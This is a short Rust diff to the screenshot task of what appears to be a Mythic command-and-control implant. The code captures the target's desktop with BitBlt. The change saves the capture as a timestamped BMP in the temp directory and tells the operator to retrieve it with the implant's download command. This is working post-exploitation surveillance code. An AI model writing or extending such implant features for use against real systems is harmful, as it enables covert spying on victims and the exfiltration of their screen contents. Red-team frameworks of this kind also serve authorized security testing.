@@ -49,28 +49,31 @@ pub fn take_screenshot(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Er
             return Err(format!("BitBlt failed. Error: {}", GetLastError()).into());
         }
 
-        // Save screenshot to a temporary .bmp file
-        let temp_path = std::env::temp_dir().join("screenshot.bmp");
-        save_bitmap_to_file(hbitmap, width as u32, height as u32, &temp_path)?;
+        // Save screenshot to a file with timestamp
+        let timestamp = std::time::SystemTime::now()
+            .duration_since(std::time::UNIX_EPOCH)
+            .unwrap()
+            .as_secs();
+        let filename = format!("screenshot_{}.bmp", timestamp);
+        let screenshot_path = std::env::temp_dir().join(&filename);
+        
+        save_bitmap_to_file(hbitmap, width as u32, height as u32, &screenshot_path)?;
 
         // Cleanup
         DeleteObject(hbitmap as *mut _);
         DeleteDC(hdc_mem);
         ReleaseDC(hwnd_desktop, hdc_screen);
 
-        // Read BMP bytes
-        let screenshot_data = fs::read(&temp_path)?;
-        let _ = fs::remove_file(&temp_path);
-
-        // Encode to base64
-        let encoded_data = general_purpose::STANDARD.encode(&screenshot_data);
+        // Read BMP bytes for size info
+        let screenshot_data = fs::read(&screenshot_path)?;
 
         Ok(mythic_success!(
             task.id,
             format!(
-                "Screenshot captured successfully ({} bytes, base64 length {}).",
+                "Screenshot saved to: {}\nFile size: {} bytes\nYou can download it using: download {}",
+                screenshot_path.to_string_lossy(),
                 screenshot_data.len(),
-                encoded_data.len()
+                screenshot_path.to_string_lossy()
             )
         ))
     }
